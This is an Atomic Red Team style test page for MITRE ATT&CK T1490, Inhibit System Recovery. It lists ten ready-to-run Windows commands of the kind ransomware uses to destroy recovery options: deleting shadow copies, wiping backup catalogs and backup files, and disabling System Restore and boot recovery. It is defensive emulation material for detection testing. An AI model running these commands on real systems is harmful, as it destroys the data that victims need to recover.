---
tags: [T1490, atomic_test]
filename: "[[T1490 - Inhibit System Recovery]]"
---
# T1490 - Inhibit System Recovery

## Atomic Test #1 - Windows - Delete Volume Shadow Copies
Deletes Windows Volume Shadow Copies. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon
execution, if no shadow volumes exist the message "No items found that satisfy the query." will be displayed. If shadow volumes are present, it
will delete them without printing output to the screen. This is because the /quiet parameter was passed which also suppresses the y/n
confirmation prompt. Shadow copies can only be created on Windows server or Windows 8.

https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc788055(v=ws.11)

**Supported Platforms:** Windows


**auto_generated_guid:** 43819286-91a9-4369-90ed-d31fb4da2c01






#### Attack Commands: Run with `command_prompt`!  Elevation Required (e.g. root or admin) 


```cmd
vssadmin.exe delete shadows /all /quiet
```




#### Dependencies:  Run with `powershell`!
##### Description: Create volume shadow copy of C:\ . This prereq command only works on Windows Server or Windows 8.
##### Check Prereq Commands:
```powershell
if(!(vssadmin.exe list shadows | findstr "No items found that satisfy the query.")) { exit 0 } else { exit 1 }
```
##### Get Prereq Commands:
```powershell
vssadmin.exe create shadow /for=c:
```




<br/>
<br/>

## Atomic Test #2 - Windows - Delete Volume Shadow Copies via WMI
Deletes Windows Volume Shadow Copies via WMI. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.
Shadow copies can only be created on Windows server or Windows 8.

**Supported Platforms:** Windows


**auto_generated_guid:** 6a3ff8dd-f49c-4272-a658-11c2fe58bd88






#### Attack Commands: Run with `command_prompt`!  Elevation Required (e.g. root or admin) 


```cmd
wmic.exe shadowcopy delete
```






<br/>
<br/>

## Atomic Test #3 - Windows - wbadmin Delete Windows Backup Catalog
Deletes Windows Backup Catalog. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon execution,
"The backup catalog has been successfully deleted." will be displayed in the PowerShell session.

**Supported Platforms:** Windows


**auto_generated_guid:** 263ba6cb-ea2b-41c9-9d4e-b652dadd002c






#### Attack Commands: Run with `command_prompt`!  Elevation Required (e.g. root or admin) 


```cmd
wbadmin delete catalog -quiet
```






<br/>
<br/>

## Atomic Test #4 - Windows - Disable Windows Recovery Console Repair
Disables repair by the Windows Recovery Console on boot. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.
Upon execution, "The operation completed successfully." will be displayed in the powershell session.

**Supported Platforms:** Windows


**auto_generated_guid:** cf21060a-80b3-4238-a595-22525de4ab81






#### Attack Commands: Run with `command_prompt`!  Elevation Required (e.g. root or admin) 


```cmd
bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
bcdedit.exe /set {default} recoveryenabled no
```

#### Cleanup Commands:
```cmd
bcdedit.exe /set {default} bootstatuspolicy DisplayAllFailures >nul 2>&1
bcdedit.exe /set {default} recoveryenabled yes >nul 2>&1
```





<br/>
<br/>

## Atomic Test #5 - Windows - Delete Volume Shadow Copies via WMI with PowerShell
Deletes Windows Volume Shadow Copies with PowerShell code and Get-WMIObject.
This technique is used by numerous ransomware families such as Sodinokibi/REvil.
Executes Get-WMIObject. Shadow copies can only be created on Windows server or Windows 8, so upon execution
there may be no output displayed.

**Supported Platforms:** Windows


**auto_generated_guid:** 39a295ca-7059-4a88-86f6-09556c1211e7






#### Attack Commands: Run with `powershell`!  Elevation Required (e.g. root or admin) 


```powershell
Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
```






<br/>
<br/>

## Atomic Test #6 - Windows - Delete Backup Files
Deletes backup files in a manner similar to Ryuk ransomware. Upon exection, many "access is denied" messages will appear as the commands try
to delete files from around the system.

**Supported Platforms:** Windows


**auto_generated_guid:** 6b1dbaf6-cc8a-4ea6-891f-6058569653bf






#### Attack Commands: Run with `command_prompt`!  Elevation Required (e.g. root or admin) 


```cmd
del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
```






<br/>
<br/>

## Atomic Test #7 - Windows - wbadmin Delete systemstatebackup
Deletes the Windows systemstatebackup using wbadmin.exe. This technique is used by numerous ransomware families. This may only be successful on server platforms that have Windows Backup enabled.

**Supported Platforms:** Windows


**auto_generated_guid:** 584331dd-75bc-4c02-9e0b-17f5fd81c748






#### Attack Commands: Run with `command_prompt`!  Elevation Required (e.g. root or admin) 


```cmd
wbadmin delete systemstatebackup -keepVersions:0
```






<br/>
<br/>

## Atomic Test #8 - Windows - Disable the SR scheduled task
Use schtasks.exe to disable the System Restore (SR) scheduled task

**Supported Platforms:** Windows


**auto_generated_guid:** 1c68c68d-83a4-4981-974e-8993055fa034






#### Attack Commands: Run with `command_prompt`!  Elevation Required (e.g. root or admin) 


```cmd
schtasks.exe /Change /TN "\Microsoft\Windows\SystemRestore\SR" /disable
```

#### Cleanup Commands:
```cmd
schtasks.exe /Change /TN "\Microsoft\Windows\SystemRestore\SR" /enable >nul 2>&1
```





<br/>
<br/>

## Atomic Test #9 - Disable System Restore Through Registry
Modify the registry of the currently logged in user using reg.exe via cmd console to disable system restore on the computer. 
See how remcos RAT abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details

**Supported Platforms:** Windows


**auto_generated_guid:** 66e647d1-8741-4e43-b7c1-334760c2047f






#### Attack Commands: Run with `command_prompt`!  Elevation Required (e.g. root or admin) 


```cmd
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f
```

#### Cleanup Commands:
```cmd
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /f >nul 2>&1
```





<br/>
<br/>

## Atomic Test #10 - Windows - vssadmin Resize Shadowstorage Volume
Adversaries generally try to Resize Shadowstorage Volume using vssadmin.exe to avoid the shadow volumes being made again. This technique is typically found used by adversaries during a ransomware event and a precursor to deleting the shadowstorage.

**Supported Platforms:** Windows


**auto_generated_guid:** da558b07-69ae-41b9-b9d4-4d98154a7049






#### Attack Commands: Run with `powershell`!  Elevation Required (e.g. root or admin) 


```powershell
vssadmin resize shadowstorage /For=C: /On=C: /MaxSize=20%
```






<br/>
